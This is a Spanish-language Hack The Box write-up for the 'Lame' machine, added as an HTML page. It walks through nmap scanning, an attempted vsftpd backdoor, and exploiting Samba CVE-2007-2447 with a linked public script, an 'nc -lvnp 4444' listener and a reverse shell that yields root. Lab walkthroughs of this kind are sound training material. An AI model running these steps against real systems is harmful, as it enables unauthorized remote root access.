@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lame | HTB</title>
+
+  <meta name="description" content="Writeup de la máquina Lame de Hack The Box: enumeración, explotación y escalada de privilegios." />
+  <meta property="og:title" content="Lame | HTB" />
+  <meta property="og:description" content="Writeup de la máquina Lame de Hack The Box: enumeración, explotación y escalada de privilegios." />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://phantomcrypter.github.io/writeups/lame.html" />
+  <meta property="og:image" content="https://phantomcrypter.github.io/assets/img/og-default.pngg" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <link rel="icon" type="image/png" href="../assets/img/favicon.png" />
+
+    <!-- Estilos principales -->
+  <link rel="stylesheet" href="../assets/css/style.css" />
+  <!-- Fuente y resaltado de código -->
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+
+  
+</head>
+<body class="glitch-bg">
+  <nav class="navbar">
+    <ul class="nav-list">
+      <li><a href="../index.html">Inicio</a></li>
+      <li><a href="../projects.html">Proyectos</a></li>
+      <li><a href="../blog.html">Blog</a></li>
+      <li><a href="../notes.html">Notas</a></li>
+      <li><a href="../writeups.html">Writeups</a></li>
+      <li><a href="../about.html">Sobre mí</a></li>
+      <li><a href="../contact.html">Contacto</a></li>
+    </ul>
+  </nav>
+
+  <main class="blog-container">
+    <section class="blog-post">
+      <div class="terminal-box">
+        <a href="../writeups.html">← Volver a Writeups</a>
+        <h1>Lame // Linux // Easy // HTB</h1>
+
+        
+        <div class="img-placeholder">
+          <img src="../assets/img/writeups/lame/lame_banner.webp" alt="Lame - placeholder">
+        </div>
+        <br>
+
+        <article>
+
+          <section id="Reconocimiento">
+            <h2>Fase de reconocimiento</h2>
+            <br>  
+            <p>Primero procedo a hacer un análisis de puertos con nmap hacia el servidor:</p>
+             <br>
+            <pre><code class="bash">sudo nmap -sS -p- --open --min-rate 5000 10.129.192.172 -Pn -oA Lame-recon</code></pre>
+            <br>
+            <ul>
+                <li><strong style="color: aquamarine;">-sS:</strong> Especifico el uso de un escaneo SYN (half-open)</li>
+                <li><strong style="color: aquamarine;">-p-:</strong> Indico que quiero escanear todo el rango de puertos</li>
+                <li><strong style="color: aquamarine;">--open:</strong> Esto me filtra solo por los puertos abiertos</li>
+                <li><strong style="color: aquamarine;">--min-rate 5000:</strong> Esto hace que el escaneo sea más rápido</li>
+                <li><strong style="color: aquamarine;">-Pn:</strong> Esto hace que no haga ping por lo que acelera el escaneo</li>
+                <li><strong style="color: aquamarine;">-oA Lame-recon:</strong> Guarda el resultado del escaneo en un archivo llamado Lame-recon, y de esta forma se puede revisar el resultado posteriormente</li>
+            </ul>
+            <br>
+           
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/lame/lame_nmap1.webp" alt="Lame - Nmap puertos">
+            </div>
+            <br>
+            <p>El resultado del escaneo muestra que se encuentran abiertos los puertos 21,22,139 y el 445, por lo que procedo a hacer un escaneo más profundo en estos puertos para ver si hay versiones vulnerables:</p>
+            <br>
+            <pre><code class="bash">nmap -sCV -p 21,22,139,445 10.129.192.172 -oN Versions</code></pre>
+            <br>
+            <ul>
+                <li><strong style="color: aquamarine;">-sCV:</strong> Especifico que quiero hacer un escaneo de scripts básicos de Nmap (C) y de versiones (V)</li>
+                <li><strong style="color: aquamarine;">-p 21,22,139,445:</strong> Indico que quiero escanear solo los puertos 21,22,139 y 445</li>
+                <li><strong style="color: aquamarine;">-oN Versions:</strong> Guarda el resultado del escaneo en un archivo llamado Versions, y de esta forma se puede revisar el resultado posteriormente</li>
+            </ul>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/lame/lame_nmap2.webp" alt="Lame - Nmap versiones">
+            </div>
+            <br>
+            <p>El resultado del escaneo muestra que el puerto 21 tiene un servicio vsftpd 2.3.4, el puerto 22 tiene un servicio SSH y el puerto 139 y 445 tienen servicios SMB con una version 3.0.20, por lo que procedo a confirmar con searchsploit si hay alguna vulnerabilidad conocida para el servicio vsftpd 2.3.4 y efectivamente hay una vulnerabilidad de backdoor que permite obtener una shell remota.</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/lame/lame_searchsploit.webp" alt="Lame - Searchsploit">
+            </div>
+            <br>
+            <p>Al intentar explotar la vulnerabilidad no logro obtener el acceso debido a una restricción del firewall.</p>
+            <br>
+            <p>Ahora lo que procedo a hacer es revisar si smb tiene alguna vulnerabilidad conocida.</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/lame/lame_smb.webp" alt="Lame - SMB">
+            </div>
+            <br>
+            <h2>Explotación</h2>
+            <p>Al investigar sobre la vulnerabilidad de SMB, veo que es una vulnerabilidad crítica de RCE (Remote Code Execution) por lo que puede servir para lo que estoy buscando.</p>
+            <br>
+            <p>Al buscar en internet, encuentro un <a href="https://github.com/amriunix/CVE-2007-2447/tree/master" target="_blank">github</a> el cual contiene una exploit para esta vulnerabilidad el cual puede ser de utilidad.</p>
+            <p>Pero antes de ejecutar el exploit, debemos crear un venv de Python ya que debemos instalar el módulo pysmb:</p>
+            <pre><code class="bash">$ python3 -m venv smb_exploit</code></pre>
+            <pre><code class="bash">$ source smb_exploit/bin/activate</code></pre>
+            <pre><code class="bash">$ pip install pysmb</code></pre>
+            <br>
+            <p>Una vez instalado el módulo, configuramos una escucha con ncat:</p>
+            <pre><code class="bash">$ nc -lvnp 4444</code></pre>
+            <br>
+            <p>Después de configurar la escucha, ejecutamos el exploit:</p>
+            <pre><code class="bash">$ python usermap_script.py &lt;RHOST&gt; &lt;RPORT&gt; &lt;LHOST&gt; &lt;LPORT&gt;</code></pre>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/lame/lame_smb_exploit.webp" alt="Lame - SMB exploit">
+            </div>
+            <br>
+            <p>Una vez ejecutado el exploit, se obtiene una shell reversa en la escucha configurada con acceso root.</p>
+            <p>Si se desea operar de una manera más cómoda, puede intentar sanitizar la terminal a como he mostrado otras veces en publicaciones de instagram: <a href="https://www.instagram.com/p/DMQja97Oj7G/?img_index=1" target="_blank">Cómo sanitizan sus terminales?</a></p>
+            <p>O puede revisar la publicación en mi blog: <a href="https://phantomcrypter.github.io/blog/san-tem.html" target="_blank">Sanitizar Terminal</a></p>
+            <br>
+            <p>Como ya tenemos acceso a root, solo tenemos que explorar el sistema de archivos para encontrar las flags y completar el reto.</p>
+            <br>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/lame/lame_root.webp" alt="Lame - Root access">
+            </div>
+            <br>
+         <footer class="post-footer">
+            <span class="post-date"><time datetime="2026-10-28">2026-10-28</time></span>
+            <div class="post-social">
+                <p>[ contact ]</p>
+                <a href="https://www.twitch.tv/kallrize" target="_blank">twitch</a>
+                <a href="https://www.youtube.com/@kallrizeklr5364" target="_blank">Youtube</a>
+                <a href="https://www.linkedin.com/in/gabrielp%C3%A9rez-959645213" target="_blank">linkedin</a>
+            </div>
+        </footer>
+        </article>
+      </div>
+    </section>
+  </main>
+</body>
+</html>
